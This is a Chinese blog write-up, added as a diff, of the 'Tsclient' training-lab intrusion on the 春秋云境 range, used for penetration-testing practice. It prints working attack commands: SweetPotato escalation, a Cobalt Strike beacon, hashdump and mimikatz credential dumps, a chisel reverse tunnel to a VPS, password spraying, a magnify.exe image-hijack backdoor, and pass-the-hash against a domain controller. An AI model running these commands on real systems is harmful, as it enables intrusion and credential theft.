@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    
+    <title>春秋云境-Tsclient | T1ng的摆烂日常</title>
+    
+    
+        <meta property="og:site_name" content="T1ng的摆烂日常">
+    
+    
+        <meta property="article:author" content="T1ng">
+    
+    
+        <link rel="icon" href="/img/t1ng.ico">
+    
+    
+<link rel="stylesheet" href="/css/minireset.min.css">
+
+    
+<link rel="stylesheet" href="/css/all.min.css">
+
+    
+<link rel="stylesheet" href="/css/csshake.min.css">
+
+    
+<link rel="stylesheet" href="/css/hljs/lioshi.css">
+
+    
+<link rel="stylesheet" href="/css/jquery.fancybox.min.css">
+
+    
+<link rel="stylesheet" href="/styl/main.css">
+
+    
+<script src="/js/jquery.min.js"></script>
+
+    
+<script src="/js/highlight.min.js"></script>
+
+    
+<script src="/js/jquery.fancybox.min.js"></script>
+
+    
+<script src="/js/clipboard.min.js"></script>
+
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <header>
+  <div class="outer">
+    <div class="inner">
+      <h1 class="logo-wrap">
+        <a>T1ng的摆烂日常<b><sup></sup></b></a>
+      </h1>
+    </div>
+    <div class="inner">
+      <nav class="main-nav">
+        
+          
+            <a href="/">首页</a>
+          
+        
+          
+            <a href="/archives">归档</a>
+          
+        
+          
+            <a href="/categories">分类</a>
+          
+        
+          
+            <a href="/tags">标签</a>
+          
+        
+          
+            <a href="/friends">友链</a>
+          
+        
+          
+            <div class="dropdown">
+              <a class="dropbtn">相关链接</a>
+              <div class="dropdown-content">
+                
+              </div>
+            </div>
+          
+        
+          
+            <a href="/about">关于</a>
+          
+        
+      </nav>
+    </div>
+  </div>
+</header>
+    <div class="content">
+        <section class="outer">
+    <article>
+        <div class="article-title">
+    <h2>
+        <a href="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/" class="shake shake-little" title="春秋云境-Tsclient">
+            
+            春秋云境-Tsclient
+        </a>
+    </h2>
+    <div class="meta_box">
+    
+        
+        
+            
+                
+        
+        <div class="meta meta_auth">
+            <img src="/img/t1ng.png" alt="head" />
+            <p>t1ng</p>
+        </div>
+    
+        
+        
+        <div class="meta meta_date">
+            <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+            <p>发布于：2025年03月08日</p>
+        </div>
+    
+        <div class="meta meta_update">
+            <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+            <p>更新于：2025年03月08日</p>
+        </div>
+    </div>
+    
+  <div class="post_tags">
+    <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/" rel="tag"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>春秋云境</a></li></ul>
+  </div>
+
+
+</div>
+
+        <hr>
+        <div class="article-entry">
+            
+            
+            
+            <p>访问发现是Windows主机，但并没有什么有用的信息<br><img src="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/9226450074ff5fe86d440023bee438c2.png"></p>
+<p><img src="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/9a5a5f3b505e880a061b8beb9cb67e6e.png"><br>fscan开扫，发现m ssql数据库用户名和密码，MDUT拿到Shell。<br><img src="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/70bafd8876ceab5b38ce3b73f4fd15d1.png"><br>执行whoami查看用户，发现是sqlserver，权限较低。<br><img src="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/41c5e43947475ec601b8f47f3087e1f4.png"><br>尝试利用Sweetpotato进行提权。<br><img src="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/9e92ad40940c2791d0decca455d50e5a.png"><br>命令执行 C:&#x2F;Users&#x2F;Public&#x2F;SweetPotato.exe -a “whoami”<br><img src="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/19793dc78c31307c764a69dba50ba21c.png"><br>发现可以正常执行，上传cs马，执行cs马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato.exe -a &quot;C:/Users/Public/beacon_x64.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/be593718352129c88d17556a2935f4da.png">cs成功上线<br><img src="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/f23ce3745e2757e875150fbc6c667ebb.png"><br>执行命令，得到flag1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell type C:\Users\Administrator\flag\flag01.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/448b26a2fc9c76077e5c18a77792db2e.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[03/08 16:09:01] beacon&gt; hashdump</span><br><span class="line">[03/08 16:09:01] [*] Tasked beacon to dump hashes</span><br><span class="line">[03/08 16:09:59] [+] host called home, sent: 82541 bytes</span><br><span class="line">[03/08 16:10:01] [+] received password hashes:</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:2caf35bb4c5059a3d50599844e2b9b1f:::</span><br><span class="line">cxcx:1013:aad3b435b51404eeaad3b435b51404ee:72d98c440b25ce7b05d81233044c020c:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">John:1008:aad3b435b51404eeaad3b435b51404ee:eec9381b043f098b011be51622282027:::</span><br></pre></td></tr></table></figure>
+
+<p>查看网络连接等</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell netstat -ano</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/79888364eb73aae0090bc62bc7a4f4e1.png"><br>看到3389端口指向<code>172.22.8.31</code>另一个主机<br>查看在线用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell quser || qwinst</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/7b03f99152439c5df719fd52401c4b6b.png"><br>发现john用户，可以cs注入进程进行上线。<br><img src="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/d88bcd0245f711a689e037faad597c33.png"><br>成功上线John<br><img src="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/6bb36f84fc16aba7f4b50344a16b494a.png"><br>查看共享资源，列出目录文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net use</span><br><span class="line">shell dir \\tsclient\c</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/3bdd3725a5d57a1b4e3d188453adf099.png"><br>读取文件，拿到账号密码，并提醒映像劫持</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell type \\tsclient\c\credential.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">03/08 16:20:22] beacon&gt; shell type \\tsclient\c\credential.txt</span><br><span class="line">[03/08 16:20:23] [*] Tasked beacon to run: type \\tsclient\c\credential.txt</span><br><span class="line">[03/08 16:21:11] [+] host called home, sent: 63 bytes</span><br><span class="line">[03/08 16:21:11] [+] received output:</span><br><span class="line">xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#</span><br><span class="line"></span><br><span class="line">Do you know how to hijack Image?</span><br></pre></td></tr></table></figure>
+
+<p>上传<code>chisel.exe</code>和<code>fscan</code>，扫描内网并进行内网穿透<br>先进行fscan扫描内网</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\\Users\\Public\\t1ng\\fscan.exe -h 172.22.8.0/24</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">[03/08 16:32:37] beacon&gt; shell C:\\Users\\Public\\fscan.exe -h 172.22.8.0/24</span><br><span class="line">[03/08 16:32:38] [*] Tasked beacon to run: C:\\Users\\Public\\fscan.exe -h 172.22.8.0/24</span><br><span class="line">[03/08 16:33:15] [+] host called home, sent: 82 bytes</span><br><span class="line">[03/08 16:33:25] [+] received output:</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 172.22.8.18     is alive</span><br><span class="line">(icmp) Target 172.22.8.15     is alive</span><br><span class="line">(icmp) Target 172.22.8.31     is alive</span><br><span class="line">(icmp) Target 172.22.8.46     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.8.46:445 open</span><br><span class="line">172.22.8.18:1433 open</span><br><span class="line">172.22.8.31:445 open</span><br><span class="line">172.22.8.15:445 open</span><br><span class="line">172.22.8.18:445 open</span><br><span class="line">172.22.8.46:139 open</span><br><span class="line">172.22.8.15:139 open</span><br><span class="line">172.22.8.31:139 open</span><br><span class="line">172.22.8.15:88 open</span><br><span class="line">172.22.8.46:135 open</span><br><span class="line">172.22.8.31:135 open</span><br><span class="line">172.22.8.18:139 open</span><br><span class="line">172.22.8.15:135 open</span><br><span class="line">172.22.8.18:135 open</span><br><span class="line">172.22.8.46:80 open</span><br><span class="line">172.22.8.18:80 open</span><br><span class="line">[*] alive ports len is: 16</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.46</span><br><span class="line">   [-&gt;]WIN2016</span><br><span class="line">   [-&gt;]172.22.8.46</span><br><span class="line">[*] NetBios 172.22.8.15     [+] DC:XIAORANG\DC01           </span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.18</span><br><span class="line">   [-&gt;]WIN-WEB</span><br><span class="line">   [-&gt;]172.22.8.18</span><br><span class="line">   [-&gt;]2001:0:348b:fb58:3430:be2:d89c:72b2</span><br><span class="line">[*] WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.31</span><br><span class="line">   [-&gt;]WIN19-CLIENT</span><br><span class="line">   [-&gt;]172.22.8.31</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.15</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.8.15</span><br><span class="line">[*] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT         </span><br><span class="line">[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server</span><br><span class="line">[+] mssql 172.22.8.18:1433:sa 1qaz!QAZ</span><br></pre></td></tr></table></figure>
+
+<p><code>chisel</code>内网穿透</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">靶机</span><br><span class="line">shell C:\\Users\\Public\\chisel.exe client vps_ip:9002 R:0.0.0.0:9003:socks</span><br><span class="line"></span><br><span class="line">vps</span><br><span class="line">./chisel server -p 9002 --reverse</span><br></pre></td></tr></table></figure>
+
+<p>利用cme进行密码喷射</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q crackmapexec smb 172.22.8.0/24 -u &#x27;Aldrich&#x27; -p &#x27;Ald@rLMWuy7Z!#&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/02e6886ee760160c87849c925d3218c8.png"><br>发现可以登录<code>172.22.8.46</code>主机，但是会显示密码过期，使用<code>smbpasswd</code>修改密码<br><a target="_blank" rel="noopener" href="https://github.com/Lex-Case/Impacket/tree/master">Lex-Case&#x2F;Impacket: Impacket is a collection of Python classes for working with network protocols.</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q python3 smbpasswd.py xiaorang.lab/Aldrich:&#x27;Ald@rLMWuy7Z!#&#x27;@172.22.8.46 -newpass &#x27;QWERqwer1234&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/83f17f9a75e9b9728c53d436197877f0.png"><br>RDP远程桌面连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 rdesktop 172.22.8.46 -u Aldrich -d xiaorang.lab -p &#x27;QWERqwer1234&#x27; -r disk:share=/home/kali/Desktop/tmp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/62d5e47ec79406a42c2e6e29100a880a.png"></p>
+<p>映像劫持，利用放大镜提权<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/321211.html">映像劫持的几种利用方式 - FreeBuf网络安全行业门户</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\windows\system32\cmd.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/5aa6c8fcc38be58e66ac5f472bdacdb4.png"><br>开始，锁定<br><img src="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/8dcfc0a28c64e2fda7f6a5a8297f82f9.png"><br>点击放大镜<br><img src="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/c1c5d44ede8c677c4010c68f4971f4a2.png"><br><img src="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/43ae04d7128b1df7c451a202277ff99e.png"><br>成功提权，读flag02</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\User\Administrator\flag\flag02.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/feff7846d15fa619bb16a8660b525cb5.png"><br>尝试查看主机是否出网，<br><img src="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/6be329c8f1ddbc9687e9c609491a6486.png"><br> 上传<code>mimikatz</code>，同样位置执行</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p>拿到用户名和NTML哈希，哈希传递<br><img src="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/366b773d340839607a2191e9bc01347f.png"><br>拿PTH打DC</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.8.15 -u WIN2016$ -H b5a0472a0c4933f0d50b7c499d267e0f -d xiaorang -x &quot;type C:\Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/784de068039ffc9e1edaeaa809d34014.png"></p>
+
+            <div class="article-copyright">
+                
+
+            </div>
+        </div>
+    </article>
+    
+
+
+</section>
+    </div>
+    <footer>
+    <div class="outer">
+        <div class="inner">
+            Powered by <a href="https://github.com/hdxw/hexo-theme-prowiki" target="_blank">ProWiki</a>
+            &copy;2025 t1ng<br>
+            <a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/"></a>
+            <div style="height: 50px;"></div>
+
+            <!-- 不蒜子统计信息 -->
+            <div id="busuanzi_container">
+                <span id="busuanzi_value_site_uv"></span> 访客 | 
+                <span id="busuanzi_value_site_pv"></span> 访问量
+            </div>
+
+            <!-- 不蒜子脚本 -->
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        </div>
+    </div>
+</footer>
+
+<script src="/js/custom.js"></script>
+
+
+    <script>onload_content();</script>
+
+</body>
+</html>
